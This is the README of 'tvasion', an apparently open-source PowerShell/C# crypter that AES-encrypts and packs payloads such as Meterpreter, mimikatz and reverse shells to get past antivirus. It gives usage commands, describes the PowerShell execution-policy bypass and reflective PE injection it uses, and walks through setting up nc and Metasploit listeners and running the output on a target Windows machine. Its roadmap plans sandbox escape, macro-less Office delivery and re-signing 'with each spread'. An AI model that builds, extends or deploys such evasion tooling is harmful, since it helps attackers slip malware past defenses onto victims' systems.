# :performing_arts: tvasion - Powershell / C# AES anti virus evasion 
Anti virus evasion based on file signature change via AES encryption with Powershell and C# AV evasion templates which support executable and Powershell payloads with Windows executable, Powershell or batch output. Developed with Powershell on Linux for Windows targets :)

Buzzwords: Anti virus evasion, AV evasion, crypter, AES encryption, ReflectivePEInjection, PowerShell execution policy bypass

### !!! Work in progress. See TODO. Powershell related ouput not FUD !!!

[https://github.com/loadenmb/tvasion](https://github.com/loadenmb/tvasion)

## Features
- outputs 32 bit executable (.exe), Powershell (.ps1) or batch (.bat)
- works with excutable + Powershell payloads
- AES encryption for file signature change
- no hard drive traces / no hard disk write operation
- Powershell and C# evasion templates available
- EXOTIC: Powershell, mono mcs based developed on Linux for Windows targets :-)

## Usage
```
./tvasion.ps1 -h
tvasion: AES based anti virus evasion
./tvasion.ps1 -t (exe|bat|ps1|b64ps1|b64) [PAYLOAD (exe|ps1)] OR ./tvasion.ps1 [PAYLOAD (exe|ps1)] -t (exe|bat|ps1|b64ps1|b64)
parameter:
[PAYLOAD (exe|ps1)]                 input file path. requires: exe, ps1                     required
-t (exe|ps1|bat|b64ps1|b64)         output file type: exe, ps1, bat, b64ps1, b64            required
-i (PATH)                           path to icon. requires: .exe output (-t exe)            optional
-f (PATH)                           path to template                                        optional
-o (PATH)                           set output directory. default is ./out/                 optional
-d                                  generate debug output                                   optional
-h                                  display this help                                       optional
examples:
./tvasion.ps1 -t exe tests/ReverseShell.ps1                                       # generate windows executable (.exe) from powershell
./tvasion.ps1 -t exe out/Meterpreter_amd64.exe -i tests/ghost.ico                 # generate windows executable (.exe) from executable, custom icon (-i)
./tvasion.ps1 -t bat tests/ReverseShell.ps1                                       # generate batch (.bat) from powershell
./tvasion.ps1 -t ps1 out/Meterpreter_amd64.exe -f mytpl1.ps1 -o ../ -d            # ... .exe -> .ps1, custom template (-f), out dir (-o), debug (-d)
```
Files generated in ./out directory
See more examples in: [test file](tests.ps1)

## Setup Debian Stretch / Kali Linux
Depencies:
- [PowerShell](https://github.com/PowerShell/PowerShell)  
- [mono-mcs](https://www.mono-project.com/docs/about-mono/languages/csharp/) (optional but required for cross plattform executable compilation for executeable payloads)

```shell
# setup Powershell for Linux. see link above, be root

# install compiler depencies (optional, required for executable output)
apt-get install -y mono-mcs

# clone with git
git clone https://github.com/loadenmb/tvasion.git
```
    
## Advanced usage 

### Details

Change AES decryption template source code to make sure evasion output is undetectable by anti virus solutions.

C# and powershell templates from ./templates/ directory basically do: 
```
decode -> decrypt -> launch payload
```
It's input / output type dependent which template needs changes. See here:

| payload type  |  output type      | template from ./templates/ folder |  details |
| ------------- | -------------     | --------------------------------- | -------- |
| powershell    | powershell        | default.ps1                       | Invoke-Expression |
| executable    | powershell        | default_exe.ps1                   | Invoke-Expression + ReflectivePEInjection (*1) |
| executable    | executable        | default_exe.cs                    | PEInjection (*1) |
| powershell    | executable        | default.cs                        | PowerShell execution policy bypass with -Enc (*2) |
| powershell    | batch             | default_bat.ps1 + default.bat     | PowerShell execution policy bypass with -C + Invoke-Expression |
| executable    | batch             | default_exe_bat.ps1 + default.bat | PowerShell execution policy bypass with -C + Invoke-Expression + ReflectivePEInjection (*1) |
| powershell    | base64 powershell | default.ps1                       | Invoke-Expression |
| executable    | base64 powershell | default_exe.ps1                   | Invoke-Expression + ReflectivePEInjection (*1) |

(*1) not all binaries work; Meterpreter, mimikatz work. See [DEP](https://stackoverflow.com/questions/350977/how-to-make-my-program-dep-compatible), [ASLR](https://security.stackexchange.com/questions/18556/how-do-aslr-and-dep-work), and [what to do against](https://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx).

(*2) payload size restriction of arguments length of process.startupinfo.arguments see TODO

./templates/lib/ contain helper which get encrypted together with payload. You do not need to care about these files for a successful AV evasion.

Payload is created by [tvasion.ps1](tvasion.ps1) like this:
```
        -> gzip compression -> base64 encoding -> pasted & compiled into C# dotnet assembly -> AES encryption -> base64 encoding -> pasted & compiled into C# windows executeable (.exe -> .exe)
payload -> AES encryption -> base64 encoding 
                                -> pasted into powershell script (.ps1 -> .ps1) 
                                        -> base64 encoding 
                                                -> pasted & compiled into C# windows executeable (.ps1 -> .exe)             
                                                -> pasted into batch file (.ps1 | .exe -> .bat)
```

### Obscure options

| Option        |  Explanation  |
| ------------- | ------------- |
| -t b64ps1  | base64 encoded AES encrypted powershell output. "base64 powershell" @ template table |
| -t b64  | plain base64 encoded output (encoding only) |

For more options see:
```shell
 ./tvasion.ps1 -h
```

### Tests
Powershell reverse shell is included in ./tests/ folder for testing purposes. 

Run tests:
- [setup metasploit framework](https://metasploit.help.rapid7.com/docs/installing-the-metasploit-framework)
- change IP to your IP in configruation block of: ./tests.ps1
- run msfconsole in seperate terminal
- run ./tests.ps1 for compilation / test file creation. see ./out/ for results
- listen for reverse connections on linux machine:
```shell
# listen for reverse shell connections from ./tests/ReverseShell.ps1
nc -nvlp 4242
```
```shell
# use msfconsole you opened in other terminal, we need this launched before to generate Meterpreter in ./tests.ps1
# listen with metasploit multi handler for windows/meterpreter/reverse_tcp on port 4444 (tests.ps1 generated Meterpreter will connect this port)
cd ./tvasion/tests/
msfconsole
resource msf_multihandler.rc
```
- copy files from ./out/ directory to target Windows machine & execute

## Roadmap / TODO / ideas (feel free to work on)
- add shellcode payloads as input / output type
- add compression / script comment removement for powershell payloads / templates
- add better / alternative templates
    - fix ps1 -> exe payload size restriction / add alternative C# launcher via System.Management.Automation
    - add alternative ps1 -> ps1 template via System.Management.Automation
    - add encrypted window hide via kernel32 to all powershell stage2 templates (scanners may match for -windowstyle hidden on pwsh launch)?
- add more evasion / obfocusation functionality:
    - randomize variable names, white spaces / line breaks / tabs, call order (between markers only)
    - hide native method names
    - better cloaking for encrypted payload string
    - auto generated useless code
    - anti virus sandbox escape (maybe via long execution delay or try to allocate many resources until sandbox stops processing)
- make ./tvasion.ps1 self run on windows not created files only (never tested, this makes it easy to integrate tvasion in your tools to automatically change your signature with each spread)
- add new output types:
    - vcf ouput (local code execution, if working in 2019) 
    - .doc + .xls ouput via DDEAUTO or OLE / Powerquery (local code execution without macro)
- add executable file binder (PE file injection)?
- create cmdlet / proper psm module?
- bring back pipes support (string / hex pipes only, pswh has no binary pipes)
- use consistent rules for replacements: #REPLACE;0#, #REPLACE;1#
- add raw hex encoded ps1 output
- add possibility to bind multiple files ./tvasion.ps1 payload1.exe payloadX.exe...

## Contribute
Discuss features, report issues, questions -> [here](https://github.com/loadenmb/tvasion/issues).

Developer -> fork & pull ;)

## Related
- [Powershell ReflectivePEInjection](https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1) @ github
- [C# PE loader](https://github.com/Arno0x/CSharpScripts/blob/master/peloader.cs) @ github
- [15 ways to bypass PowerShell execution policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) @ external blog
- [AVIator - popular C# AES crypto evasion with UI, without templates](https://github.com/Ch0pin/AVIator) @ github
- [PEunion - C# crypto evasion with UI, allows bind multiple files, without templates](https://github.com/bytecode77/pe-union) @ github
